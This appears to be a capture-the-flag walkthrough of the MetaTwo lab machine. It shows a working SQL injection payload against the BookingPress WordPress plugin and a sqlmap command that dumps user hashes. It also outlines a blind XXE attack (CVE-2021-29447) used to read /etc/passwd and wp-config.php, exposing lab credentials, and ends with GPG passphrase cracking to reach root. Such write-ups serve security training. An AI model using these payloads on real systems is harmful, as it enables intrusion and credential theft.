#### RECON

Nmap scan:

```bash
21/tcp open  ftp?
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap reveal the hostname

```bash
metapress.htb
```


### Services

#### SSH
* we need creds

#### FTP
* No anonymous login allowed
* we need creds

#### HTTP

metapress.htb
![](/metatwo/img/metapress.png)

Source code
![](/metatwo/img/metapress-source-code.png)

Checking the source code reveals it is a WordPress site because of the wp-content directory, which is the default WP content directory of WordPress.

#### INITIAL ACCESS IN WORDPRESS

Checking the blog, it uses a plugin for booking their events; the plugin name is booking-press-appointment-booking. WordPress plugins typically have tones for vulnerabilities, so look for any public exploits. We found an unauthenticated SQL injection in these plugins.

Referance [ https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357]( https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357)

##### Manual sql injection 

Raw request

```bash
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: metapress.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://metapress.htb/events/
Content-Type: application/x-www-form-urlencoded
Content-Length: 98
Origin: http://metapress.htb
DNT: 1
Connection: close
Cookie: PHPSESSID=1o3qufab1906388nap0t3404td; wordpress_test_cookie=WP%20Cookie%20check

action=bookingpress_front_get_category_services&_wpnonce=a3e32ad14e&category_id=1&total_service=1
```

payload 

union sql injecton with payload 'user()' on column number 5
```bash
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: metapress.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://metapress.htb/events/
Content-Type: application/x-www-form-urlencoded
Content-Length: 142
Origin: http://metapress.htb
DNT: 1
Connection: close
Cookie: wp-settings-time-2=1667539307; PHPSESSID=as93oqjvmjhla72rlt3ir0pfes

action=bookingpress_front_get_category_services&_wpnonce=49de241183&category_id=1&total_service=1)+union+all+select+1,2,3,4,user(),6,7,8,9--+-
```

response 

```bash
[{"bookingpress_service_id":"1","bookingpress_category_id":"1","bookingpress_service_name":"Startup meeting","bookingpress_service_price":"$0.00","bookingpress_service_duration_val":"30","bookingpress_service_duration_unit":"m","bookingpress_service_description":"Join us, we will celebrate our startup!","bookingpress_service_position":"0","bookingpress_servicedate_created":"2022-06-23 18:02:38","service_price_without_currency":0,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"},{"bookingpress_service_id":"1","bookingpress_category_id":"2","bookingpress_service_name":"3","bookingpress_service_price":"$4.00","bookingpress_service_duration_val":"blog@localhost","bookingpress_service_duration_unit":"6","bookingpress_service_description":"7","bookingpress_service_position":"8","bookingpress_servicedate_created":"9","service_price_without_currency":4,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]
```

response come user "blog@localhost"

###### Automate injection with Sqlmap 

Save the raw request into req.txt file and load to sqlmap
```bash
sqlmap -r req.txt -p total_service --dump -D blog -T  wp_users
```

Dumping wp_users

Two users

```bash
admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
```

manager is crackable 

cracked hash
```bash
manager:***********
```

#### FOOTHOLD

Wordpress version is vulnerable for CVE-2021-29447 
our version  5.6.2

CVE-2021-29447 which Is a WordPress XXE Vulnerability in Media Library affected version 5.7, 5.6.2, 5.6.1, 5.6, 5.0.11. where an authenticated user with ability to upload media library can upload malicious wav file that could lead to remote arbitrary file read and server side request forgery (SSRF)

To exploit these vulnerabilitie, it takes multiple steps to complete a successful attack.That is the result of parsed iXML metadata is not sent back to the user, so to exploit it we need a blind XXE payload. This is doable by including an external Document Type Definition DTD controlled by the attacker and we need to created the malicious wav file for getting back the connection on attacker listening server. Once we done these steps upload the wav file to server wait for receives an HTTP request that includes the base64 encoded content of our payload file eg: /etc/passwd and decode the base64.

Referance [https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/]( https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/)

I wrote a script for exploit this vulnerablity

Link [https://github.com/akhils911dev/blind-xxe-controller-CVE-2021-29447](https://github.com/akhils911dev/blind-xxe-controller-CVE-2021-29447)

Reading arbitrary files

system users

root:x:0:0:root:/root:/bin/bash
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash

Reading wordpress prosses status 

/proc/self/status
```bash
$console > /proc/self/status                                                                                    
Name:   php-fpm8.0                                                                                              
Umask:  0022                                                                                                    
State:  R (running)                                                                                             
Tgid:   117548                                                                                                  
Ngid:   0                                                                                                       
Pid:    117548                                                                                                  
PPid:   704                                                                                                     
TracerPid:      0                                                                                               
Uid:    33      33      33      33                                                                              
Gid:    33      33      33      33                                                                              
FDSize: 64                                                                                                      
Groups: 33                                               
```

Worpress is running as www-data user because UID = 33
we have no access to system shell user jenelson

Move to read nginx config

/etc/nginx/sites-available/default
```bash
#No subdomains we get the absolute path of web root that is
root /var/www/metapress.htb/blog
```

Now we know the blog root directoy for checking wp-config

/var/www/metapress.htb/blog/wp-config.php

```php
$console > /var/www/metapress.htb/blog/wp-config.php
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

wp-config contain the ftp service creds

connecting to ftp

```bash
ftp -v ftp.metapress.htb
Connected to metapress.htb.
220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
Name (ftp.metapress.htb:user): metapress.htb
331 Password required for metapress.htb
Password:
230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer
226 Transfer complete
ftp> cd mailer
250 CWD command successful
ftp> dir
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer
-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22 18:32 send_email.php
226 Transfer complete
```

In the mail directory has a sendmail.php file it contain user creds

```php
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;
```

Taking ssh as jnelson

### Privilage escalation

Machine has a utility tool named passpie which is a password manager written in python and it contain user jnelson and root password stored in gpg encryption. we need passpharse for exporting the password to plaintext. Check all of our existing passwords: none of them will work. But we have the config of passpie private and public key used for gpg encryption

Location 
/home/jnelson/.passpie/.keys

Exploit    
Cracking gpg private key password using john

steps   

* Copy the private key to my local machine
* Now we have the private key
* for cracking we needs to do is convert it to a john friendly format. The jumbo pack version of jtr has a tool called gpg2john
* gpg2jogn private.key > hash
* john hash --wordlist=rockyou.txt

Cracked passpharse:blink182

Export password to plaintext 

```bash
passipe export passwords
```

Take the password swtich to root

```bash
jnelson@meta2:~$ su root
Password: 
root@meta2:/home/jnelson# id && whoami
uid=0(root) gid=0(root) groups=0(root)
root
root@meta2:/home/jnelson# 
```



